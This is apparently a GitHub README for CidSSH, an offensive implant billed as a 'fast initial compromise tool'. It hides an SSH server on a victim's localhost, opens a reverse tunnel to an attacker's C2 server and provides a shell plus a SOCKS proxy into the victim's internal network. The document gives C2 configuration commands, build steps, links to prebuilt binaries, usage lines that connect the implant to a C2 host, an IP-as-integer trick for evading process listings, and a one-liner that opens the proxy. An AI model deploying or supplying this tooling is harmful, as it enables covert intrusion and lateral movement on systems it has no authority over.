# Cid SSH
![alt text](http://equestrianstatue.org/wp-content/uploads/2016/04/Spain-Burgos-El-Cid-4-525x394.jpg)

Let's face it, there is no better shell than SSH. It just not only provides a rich encrypted shell communication but it can be used to create a socks proxy to browse the internal network of a system.

**CidSSH** is a statically compiled tool (no dependencies needed) that can be used to create an SSH server and a SSH client within just one binary. It will firstly, create RSA certificates, spin up an SSH server (listening in `localhost` and by default on port 2222),and finally create a reverse SSH tunnel with a C2 host specify by command lone. Due to the fact that the SSH server listens at `localhost`, external scanners won't detect it. 

This tool can be used as a fast initial compromise tool that can be used not only as a shell but also to browse the internal network of the victim. 

Windows systems lack of a proper TTY but thanks to [this](https://blogs.msdn.microsoft.com/commandline/2018/08/02/windows-command-line-introducing-the-windows-pseudo-console-conpty/) we can in recent Windows versions get a fully functional TTY. In the case that the target system does not support `CreatePseudoConsole` it will downgrade to a simple, not interactive shell.


## Setup instructions
### C2 server
We need to properly configure the SSH server running at the C2 so we don't get hacked.

Run all of these commands:

```
sudo useradd anonymous
echo anonymous:U6aMy0wojraho | sudo chpasswd -e
sudo usermod -s /bin/false anonymous # change /bin/false to /path/to/Cid-Controller to use Cid-Controller
```

Allow blank passwords for SSH sessions for the `anonymous` user and restrict `anonymous` user to allow only reverse port forwarding:

```
sudo cat <<EOT >> /etc/ssh/sshd_config
PermitEmptyPasswords yes

Match User anonymous
   AllowTcpForwarding remote
   X11Forwarding no
   PermitTunnel no
   GatewayPorts no
   AllowAgentForwarding no
   AllowStreamLocalForwarding no
   ForceCommand echo 'This is a disabled account'
   ClientAliveInterval 120
   ClientAliveCountMax 3
EOT
```

Restart sshd:
```sudo systemctl restart ssh```

### Prebuilt binaries
You can just use the prebuilt binaries that are in [Release](https://github.com/RedRangerz/Cid-SSH/releases/tag/v1.0). They are ready to roll.

If you want to compile from source keep reading below.

## Compilation

### Compilation on Windows
You can use the `CMakeLists.txt` along with `CMake` to create a Visual Studio project.

To easy things installing dependencies you can use `vcpkg`:
```
# Install dependencies with vcpkg (static)
git clone https://github.com/Microsoft/vcpkg.git
cd vcpkg
bootstrap-vcpkg.bat
vcpkg install --triplet x86-windows-static boost-beast boost-asio boost-system libssh[core,openssl]

git submodule update --init --recursive
# Configure and compile project
cd Cid-SSH
cmake -S . -B build_ssh -G "Visual Studio 16 2019" -A x64 -DWITH_WEBSOCKETS=OFF -DCMAKE_TOOLCHAIN_FILE=C:/Users/alberto.garcia/Documents/code/vcpkg/scripts/buildsystems/vcpkg.cmake -DVCPKG_TARGET_TRIPLET=x86-windows-static ..
cmake --build_ssh . --config Release
cmake -S . -B build_wss -G "Visual Studio 16 2019" -A x64 -DWITH_WEBSOCKETS=ON -DCMAKE_TOOLCHAIN_FILE=C:/Users/alberto.garcia/Documents/code/vcpkg/scripts/buildsystems/vcpkg.cmake -DVCPKG_TARGET_TRIPLET=x86-windows-static ..
cmake --build_wss . --config Release
```


### Compilation on Linux
CidSSH is compiled statically for linux using musl (a replacement for libc) from an Alpine distribution `x86_64`. 

There is a `build.sh` command that can be used to build everything. Just do `sh build.sh` from an Alpine system or docker container.

### Compilation on MacOs
There is a `build.sh` command that can be used to build everything. Just do `sh build.sh`

## Using it

Defaults: user is `anonymous` and default `LOCAL_SSH_SERVER_PORT` is 2222

Syntaxis:

`Cid-SSH.exe [user@]C2_hostname [LOCAL_SSH_SERVER_PORT]`

Examples:
```
Cid-SSH.exe 192.168.15.135
Cid-SSH.exe user@192.168.15.135 1234
Cid-SSH.exe user@192.168.15.135
```

You could also specify the IP address as an integer so it's not that obvious if `ps` is run:
```
Cid-SSH.exe -t 3232239495
```
Page to do the conversion: http://www.aboutmyip.com/AboutMyXApp/IP2Integer.jsp

In the C2:
```
sudo netstat -ptan | grep sshd | grep LISTEN | grep anon
# Get the port number, replace the XXXXX 
echo "" > ~/.ssh/known_hosts && sshpass -p pwd ssh user@localhost -p XXXXX -oStrictHostKeyChecking=no -D 0.0.0.0:8888
# Extra: One-liner for two previous commands:
echo "" > ~/.ssh/known_hosts && sshpass -p pwd ssh user@localhost -p `sudo netstat -ptan | grep sshd | grep LISTEN | grep anon | cut -d : -f2 | cut -d" " -f1` -oStrictHostKeyChecking=no -D 0.0.0.0:8888
```
